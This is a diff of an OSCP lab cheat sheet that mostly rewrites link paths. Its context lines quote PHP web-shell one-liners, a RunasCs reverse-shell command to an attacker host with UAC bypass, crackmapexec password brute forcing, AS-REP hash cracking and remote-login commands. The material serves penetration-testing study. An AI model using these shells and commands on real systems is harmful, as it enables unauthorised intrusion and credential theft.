@@ -351,7 +351,7 @@ See Example: [XOR-APP59](https://github.com/joetanx/oscp/blob/main/pwk-lab/xor.m
 
 ### 3.1. Fuzzing
 
-Example: [Flight](https://github.com/joetanx/oscp/blob/main/htb/flight.md), [digitalworld.local:FALL](https://github.com/joetanx/oscp/blob/main/vulnhub/digitalworld.local-fall.md)
+Example: [Flight](/htb/flight.md), [digitalworld.local:FALL](https://github.com/joetanx/oscp/blob/main/vulnhub/digitalworld.local-fall.md)
 
 #### fuff
 
@@ -471,7 +471,7 @@ Examples: [digitalworld.local-bravery](https://github.com/joetanx/oscp/blob/main
 |---|---|
 |`<?php echo passthru($_GET['k']);?>`|[Used in: ITSL:Dealer 313](https://github.com/joetanx/oscp/blob/main/itsl/2021-10-24-Dealer313.md)|
 |`<?php system($_GET[base64_decode('Y21k')]);?>`|[Used in: ITSL:VulnDC2](https://github.com/joetanx/oscp/blob/main/itsl/2022-01-17-Vulndc2.md)|
-|`<?php system($_GET['cmd']);?>`|[Used in: Flight](https://github.com/joetanx/oscp/blob/main/htb/flight.md)|
+|`<?php system($_GET['cmd']);?>`|[Used in: Flight](/htb/flight.md)|
 |`<?php echo passthru($_GET['cmd']); ?>`|[Used in: digitalworld.local:JOY](https://github.com/joetanx/oscp/blob/main/vulnhub/digitalworld.local-joy.md)|
 
 ### 4.3. Payloads
@@ -936,7 +936,7 @@ Execute:
 .\RunasCs.exe $USERNAME $PASSWORD cmd -r $KALI:$PORT --bypass-uac
 ```
 
-Used in: [flight](https://github.com/joetanx/oscp/blob/main/htb/flight.md)
+Used in: [flight](/htb/flight.md)
 
 ### 8.6. [PowerShell Empire](https://github.com/BC-SECURITY/Empire)
 
@@ -1312,7 +1312,7 @@ Verify listener hooked:
 |Brute force password|`crackmapexec smb $TARGET -u $USERNAME_LIST -p $PASSWORD_LIST`|
 |List users|`crackmapexec smb $TARGET -u $USERNAME -p $PASSWORD --users`|
 
-Used in: [Infiltrator](/machines/infiltrator.md)
+Used in: [Infiltrator](/htb/infiltrator.md)
 
 ### 9.1. [AS-REP roasting](/notes/attacking-active-directory.md#1-as-rep-roasting)
 
@@ -1324,7 +1324,7 @@ Used in: [Infiltrator](/machines/infiltrator.md)
 |Use hashcat to crack the hashes|`hashcat -m 18200 $HASH_FILE /usr/share/wordlists/rockyou.txt`|
 |Connec to target|`evil-winrm -i #TARGET -u $USERNAME -p $PASSWORD`<br>`impacket-psexec [$DOMAIN/]$USERNAME:$PASSWORD@$TARGET [$COMMAND]`|
 
-Used in: [Infiltrator](/machines/infiltrator.md)
+Used in: [Infiltrator](/htb/infiltrator.md)
 
 ### 9.2. [Password dumping](/notes/attacking-active-directory.md#2-cached-credential-storage-and-retrieval)
 
